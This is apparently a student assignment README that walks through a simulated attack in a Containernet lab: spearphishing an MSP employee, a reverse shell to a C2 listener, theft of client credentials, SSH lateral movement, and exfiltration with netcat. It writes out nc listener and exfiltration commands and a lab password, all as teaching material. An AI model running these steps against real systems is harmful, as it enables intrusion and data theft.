# CDCI – Assignment 1: Attack Scenario

An employee from an MSP provider (for exemple IBM) receives a spearphishing email. The email contains a malicious attachment that the MSP employee downloads and clicks on it.
The payload is then executed and creates a reverse shell and connects to a server controlled by the attacker (C2). Once the attacker has access to the shell it then executes different
commands in order to explore the machine and the network. It finds sensitive information about a client (named client1) like an IP address and authentication data to one of their 
machine. It uses the IBM employee machine to connect to one of the machines of client1. Once connected to the machine of client1 it starts exploring their machine and finds sensitive 
data important to the attacker and exfiltrates that data to the IBM employee machine and sends it to his C2 server.

This project demonstrates a simulated attack chain inside a Mininet + Containernet environment. The attacker compromises an MSP (Managed Service Provider) machine and pivots into a client network where sensitive data is exfiltrated.

# Prerequisites

- Install and configure Containernet following the official guide: https://github.com/containernet/containernet

- Ensure Docker is installed and running.

- OS used - Ubuntu 24.04 

# Build the Docker image (inside the docker_image directory)

sudo docker build -t cloudhopper-host .

# Start the network topology and also create a virtual env (more details on the cantainernet repo)

sudo -E env PATH=$PATH python3 topology.py

This will spawn the following hosts:

- attacker
- msp
- client1
- client2

Each host mounts a /data directory containing scenario-specific files.

# Attack steps

## 1. Attacker sets up listener on the C2 server

nc -lvnp 4444

## 2. The MSP employee receives a spearphishing email which contains a malicious attachment. The attachment in downloaded on the employee machine and then clicks on it. The script creates a reverse shell: 

bash /data/open_me.sh

## 3. Attacker gains shell access and explores the machine/network

cat /data/clients_info.txt

This file contains clients machines IPs and credentials.

## 4. Lateral movement to a client machine

Using the stolen credentials from the MSP:
ssh user1@10.0.0.3

Password: pass123

It finds an important file (sensitive_data.txt) on the client machine.

## 5. Exfiltration preparation (client1 -> msp)

The attacker exfiltrates the important file back to the MSP machine via scp or any other transfer method. 

## 6. Exfiltration from MSP to attacker (msp -> attacker)
 
Open a new attacker terminal and prepare to receive the stolen file:

nc -lvnp 5555 > stolen.txt

From the MSP reverse shell:

nc 172.17.0.3 5555 < /data/sensitive_data.txt

The attacker receives the sensitive data into stolen.txt.
